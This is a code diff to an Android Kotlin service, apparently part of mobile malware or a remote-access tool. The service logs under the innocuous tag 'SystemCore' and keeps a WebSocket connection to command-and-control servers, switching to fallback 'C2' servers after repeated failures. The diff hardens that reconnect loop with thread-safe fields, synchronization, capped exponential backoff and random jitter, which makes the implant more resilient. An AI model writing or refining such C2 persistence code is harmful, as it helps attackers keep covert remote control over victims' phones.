@@ -41,11 +41,11 @@ class CommandService : Service() {
         private const val TAG = "SystemCore"
     }
 
-    private var webSocket: WebSocket? = null
+    @Volatile private var webSocket: WebSocket? = null
     private var client: OkHttpClient? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private var isConnected = false
-    private var reconnectAttempts = 0
+    @Volatile private var isConnected = false
+    @Volatile private var reconnectAttempts = 0
     private val maxReconnectDelay = 300000L // 5 minutes max
     private lateinit var dataSyncManager: DataSyncManager
     private lateinit var commandQueue: CommandQueueManager
@@ -862,25 +862,32 @@ class CommandService : Service() {
     }
 
     private fun scheduleReconnect() {
-        reconnectAttempts++
-        val delay = minOf((1000L * (1 shl reconnectAttempts)), maxReconnectDelay)
-        Log.d(TAG, "Scheduling reconnect in ${delay}ms (attempt $reconnectAttempts)")
-        
-        // After 3 consecutive failures on same server, try next C2
-        if (reconnectAttempts > 0 && reconnectAttempts % 3 == 0) {
-            val switched = AndroidConfig.switchToNextServer()
-            if (switched) {
-                Log.w(TAG, "Primary C2 unreachable, switching to fallback: ${AndroidConfig.serverUrl}")
-            } else {
-                Log.w(TAG, "All C2 servers exhausted, cycling back to primary")
-                AndroidConfig.resetToPrimaryServer()
+        val delay: Long
+        synchronized(this) {
+            reconnectAttempts++
+            val baseDelay = minOf((1000L * (1 shl minOf(reconnectAttempts, 6))), maxReconnectDelay)
+            val jitter = (0..(baseDelay / 4)).random()
+            delay = baseDelay + jitter
+            Log.d(TAG, "Scheduling reconnect in ${delay}ms (attempt $reconnectAttempts, jitter ${jitter}ms)")
+            
+            // After 3 consecutive failures on same server, try next C2
+            if (reconnectAttempts > 0 && reconnectAttempts % 3 == 0) {
+                val switched = AndroidConfig.switchToNextServer()
+                if (switched) {
+                    Log.w(TAG, "Primary C2 unreachable, switching to fallback: ${AndroidConfig.serverUrl}")
+                } else {
+                    Log.w(TAG, "All C2 servers exhausted, cycling back to primary")
+                    AndroidConfig.resetToPrimaryServer()
+                }
             }
         }
         
         serviceScope.launch {
             delay(delay)
-            if (!isConnected) {
-                connectWebSocket()
+            synchronized(this@CommandService) {
+                if (!isConnected) {
+                    connectWebSocket()
+                }
             }
         }
     }
